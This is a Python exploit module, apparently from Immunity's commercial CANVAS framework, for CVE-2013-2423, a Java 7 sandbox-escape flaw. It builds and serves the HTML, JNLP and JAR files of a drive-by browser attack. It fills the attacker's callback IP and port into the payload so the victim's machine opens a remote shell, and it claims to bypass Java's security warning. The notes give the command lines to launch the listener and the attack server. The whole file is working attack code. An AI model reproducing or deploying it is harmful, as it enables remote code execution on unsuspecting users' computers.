#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2012
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")
    
import canvasengine
from exploitutils import *
from httpclientside import httpclientside

NAME                            = "java_DynamicBinding"
DESCRIPTION                     = "Java Dynamic Type Binding Remote Code Execution" 
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Sun"
DOCUMENTATION["Repeatability"]  = "Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"]       = "CVE-2013-2423"
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2423"
DOCUMENTATION["References"]     = "http://weblog.ikvm.net/PermaLink.aspx?guid=acd2dd6d-1028-4996-95df-efa42ac237f0"
DOCUMENTATION["Date public"]    = "04/17/2013"
DOCUMENTATION["Notes"]         = """
A vulnerability in MethodHandle allows to overwrite public final fields.
This can be abused in order to disable Java Sandbox.

The current exploit also includes a Java Security Warning Bypass that works for Java 7 update 10 up to update 17

Affected versions
JDK and JRE 7 Update 17 and earlier

Tested on:
    - Windows 7 with JDK/JRE 7 update 17 on Firefox, Chrome and IE

To run from command line, first start the listener (UNIVERSAL):
python commandlineInterface.py -l 192.168.1.10 -p 5555 -v 17

And then run the exploit from clientd:
python ./exploits/clientd/clientd.py -l 192.168.1.10 -d 5555 -O server_port:8080 -O allowed_attack_modules:java_DynamicBinding -O allowed_recon_modules:js_recon -O auto_detect_exploits:0

"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

TARGETS = { 0 : ["JDK/JRE <= 7 Update 17"]
        }


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.htmlfile           = "index.html"        
        self.htmlfilename       = "applet_jnlp_launch.html"
        self.jarfile            = "dynamicbinding.jar"
        self.jarfileName        = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".jar"
        
        self.jnlpfile            = "applet_security_bypass.jnlp"
        self.jnlpfileName        = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".jnlp"
        
        # in standalone mode we want it to adhere
        # to manually chosen callback settings ...
        self.autoFind           = False
        # this exploit can not time out ...
        # it remains active in the browser ...
        self.refresh_rate       = 0
        self.resources_dir      = resources = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
    
    def neededListenerTypes(self):
        if self.HTTPMOSDEF:
            if self.useSSLMOSDEF:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]
    
    # Vulnerability detection
    def is_vulnerable( self, info_dict ):
        major, minor, build, patch = self.getJavaVersions(info_dict)
        self.log("Checking if target is vulnerable. Detected Java version: major=%s, minor=%s, build=%s, patch=%s" % (major, minor, build, patch))
        # this is hardcoded because version is detected with an applet... if used with js_recon we might not get the version
        # we simply do it to run it anyway
        return 81 
    
        if not major:
            # No Java, piss off
            return 0 
        if major == 1:
            if minor == 7:
                if build == 0:
                    if patch <= 17:
                        return 81
                # Detected Java version: major=1, # minor=7, build=0, patch=6
        return 0

    def displayVersions(self):
        for t in TARGETS.keys():
            print "%d: %s" % (t, TARGETS[t][0])
    
    def run(self):
        self.host       = self.target.interface
        self.htmlfile   = self.argsDict.get('htmlfile', self.htmlfile)
        html            = self.makehtmlfile()
        jar             = self.makejarfile()
        jnlp            = self.makejnlpfile()
        
        self.log("[+] Opening HTML %s for output" % self.htmlfile)
        fd = file(self.htmlfile, 'wb+')
        fd.write(html)
        fd.close()
        self.log("[+] wrote to %s" % self.htmlfile)
        
        self.log("[+] Opening JNLP %s for output" % self.jnlpfile)
        fd = file(self.jnlpfileName, 'wb+')
        fd.write(jnlp)
        fd.close()
        self.log("[+] wrote to %s" % self.jnlpfileName)
        
        self.log("[+] Opening JAR %s for output" % self.jarfile)
        fd = file(self.jarfileName, 'wb+')
        fd.write(jar)
        fd.close()
        self.log("[+] Wrote to %s" % self.jarfileName)
       

        self.log("[+] Place files together in malicious webroot")        
        return 1

    ## SPIKE Proxy Callbacks ...

    def getdeployJavaFile(self):
        return file('Resources/deployJava.js', 'rb').read()
    
    def makejarfile(self):
        return file(os.path.join(self.resources_dir,self.jarfile), 'rb').read()
    
    def makejnlpfile(self):
        jnlp_file = file("Resources/%s" % self.jnlpfile, 'rb')
        jnlp_template = jnlp_file.read()
        custom_jnlp = jnlp_template.replace("[JNLP_NAME]", self.jnlpfileName)
        custom_jnlp = custom_jnlp.replace("[JAR_FILENAME]", self.jarfileName)
        custom_jnlp = custom_jnlp.replace("[MAIN_CLASSNAME]", "Main") # in this case the Applet class is Main, but in some exploits is SiteError
        custom_jnlp = custom_jnlp.replace("[HOST]", self.callback.ip)
        custom_jnlp = custom_jnlp.replace("[PORT]", str(self.callback.port))
        custom_jnlp = custom_jnlp.replace("[MOSDEF_TYPE]", str(self.engine.getMosdefType(canvasengine.JAVASERVER)))
        custom_jnlp = custom_jnlp.replace("[ID]", str(self.engine.getNewMosdefID(self)))
        custom_jnlp = custom_jnlp.replace("[CONN_TYPE]", "1" if self.HTTPMOSDEF else "0")
        custom_jnlp = custom_jnlp.replace("[USE_SSL]", str(self.useSSLMOSDEF).lower())
        jnlp_file.close()
        return custom_jnlp
        
    def makehtmlfile(self):
        html_file = file("Resources/%s" % self.htmlfilename, 'rb')
        html_template = html_file.read()
        custom_html = html_template.replace("[JNLP_NAME]", self.jnlpfileName)
        custom_html = custom_html.replace("[HTML_NAME]", self.htmlfile)
        custom_html = custom_html.replace("[MAIN_CLASSNAME]", "Main") # in this case the Applet class is Main, but in some exploits is SiteError
        html_file.close()
        return custom_html
             
        
    def makesploit(self, clientheader, clientbody):    
        # we are platform independent
        from libs.spkproxy import header, body
        h           = header('SERVER')
        b           = body()
        user_agent  = clientheader.getStrValue(['User-Agent'])
        request = clientheader.URL
     
        self.log("[+] Requesting: %s" % request)        
        self.log("[+] User agent of connecting host: %s" % user_agent)  
        
        if request.count(self.htmlfile):
            self.log("[+] Sending HTML")
            b.setBody(self.makehtmlfile())
            return h,b
            
        elif request.count(self.jnlpfileName) or clientheader.URL.count("/%s" % self.jnlpfileName) :
            self.log("[+] Sending JNLP")
            b.setBody(self.makejnlpfile())
            return h,b
            
        elif request.count(self.jarfileName):
            self.log("[+] Sending JAR")
            data = self.makejarfile()
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'binary/octet-stream')
            h.addHeader('Connection', 'close')
            b.setBody(data)
            return h,b
        
        if request.count("deployJava.js"):
            self.log("[+] Sending deployJava.js")
            b.setBody(self.getdeployJavaFile())
            return h,b
            
        elif request.count("done"):
            self.log("Did not load Java applet!")
            return None, None
        else:
            self.log("[+] Redirect to %s" % self.htmlfile)
            h.status = '302'
            h.addHeader('Location', self.htmlfile)
            h.addHeader('Content-Type', 'text/html')
            return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    
